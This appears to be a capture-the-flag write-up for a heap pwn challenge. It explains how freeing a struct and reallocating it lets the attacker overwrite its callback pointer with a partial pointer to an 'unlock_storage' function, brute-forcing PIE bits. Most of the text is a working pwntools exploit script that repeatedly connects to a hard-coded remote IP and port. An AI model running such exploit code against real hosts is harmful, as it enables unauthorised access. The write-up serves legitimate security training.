#  Bon-nie-appetit

```
score: 325
solved: 102
difficulty: medium
tags: pwn, brute-force
```

## Identify
we have a struct, 1 already instant of it:
```
------------- 0x0
<User Data>
------------- 0x48
<Pointer callback>
------------- 0x50
```
And 4 options:
- 1 - show: It wills call `callback` from pointer in struct.
- 2 - Don't care.
- 3 - Create a new instant of struct and save.
- 4 - Free instant.

The vulnerability here is accept insert data with size of struct when using option 3.
```c
offer = malloc(local_10);
fwrite("\n[*] What can you offer me? ",1,0x1c,stdout);
read(0,offer,local_10);
```
We can easy to override `callback function's pointer` with a function `unlock_storage`
## Exploit
we have checksec:
```bash
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RUNPATH:  b'./glibc/'
```
 Because have `PIE` we have to brute-force 4 bits (hope it eual 0) when override pointer:
 
 POC:
 ```python
 from pwn import *
import time

exe = ELF("./trick_or_deal")
libc = ELF("./glibc/libc.so.6")

# p = process(exe.path)

p = 0
chunk_size = 0x50

def show():
    p.sendafter(b"do? ", b"1\n")
    # tmp =p.recvuntil(b"-_-")
    # return tmp

def offer(size,data):
    p.sendafter(b"do? ",b"3\n")
    p.sendafter(b"(y/n): ",b"y\n")
    p.sendafter(b"be? ",str(size).encode()+b"\n")
    p.sendafter(b"me? ", data)

def free():
    p.sendafter(b"do? ",b"4\n")

def main():
    while (True):
        global p
        p = remote("138.68.175.87",30630)
        free()
        payload = b""
        payload += b"A"*0x48
        payload += b"\xff\x0e"
        offer(0x50,payload)
        time.sleep(0.5)
        show()
        try:
            tmp = p.recv(timeout=0.5)
            if b"[*] Bruteforcing Storage Access Code . . ." in tmp:
                p.interactive()
                break
            p.close()
        except:
            pass

if __name__ == "__main__":
    main()
 ```